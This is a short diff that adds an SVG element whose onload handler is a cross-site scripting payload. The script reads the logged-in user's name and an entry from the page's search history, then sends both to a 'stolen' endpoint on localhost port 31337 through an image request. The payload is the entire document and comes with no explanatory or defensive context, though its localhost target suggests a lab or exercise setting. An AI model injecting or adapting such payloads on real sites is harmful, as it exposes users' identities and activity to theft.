@@ -1,0 +1,6 @@
+<svg onload="window.onload = function() {
+    var user = document.getElementById('logged-in-user').innerText;
+    var search = document.getElementById('history-list').children[1].innerText;
+    var url = 'http://localhost:31337/stolen?user=' + encodeURIComponent(user) + '&last_search=' + encodeURIComponent(search);
+    new Image().src = url;
+  }">
